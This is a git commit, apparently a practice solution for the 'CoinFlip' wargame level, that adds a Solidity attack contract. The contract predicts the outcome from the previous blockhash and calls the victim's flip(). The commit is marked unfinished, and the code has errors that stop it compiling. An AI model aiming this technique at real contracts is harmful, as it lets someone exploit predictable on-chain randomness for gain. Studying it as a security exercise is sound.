26450bd48fe587859c14d2bd9808adc8bf2176b0
Poudel0 <poudel0sandesh@gmail.com>
2023-02-09 21:24:26 +0545

    CoinFLip not done

---
+++ coinflip/coinflip attack.sol
@@ -0,0 +1,21 @@
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+
+import "./coinflip.sol";
+contract CFAttack{
+   uint256 FACTOR =  57896044618658097711785492504343953926634992332820282019728792003956564819968;
+   CoinFlip public vicontract;
+    constructor(address victim){
+        vicontract = CoinFlip(victim)
+
+    }
+    function flipAttack(bool side) public returns(bool){
+            uint256 blockValue = uint256(blockhash(block.number - 1));
+            uint256 coinFlip = blockValue / FACTOR;
+            bool side = coinFlip == 1 ? true : false;
+
+            vicontract.flip(side);
+
+    }
+
+}
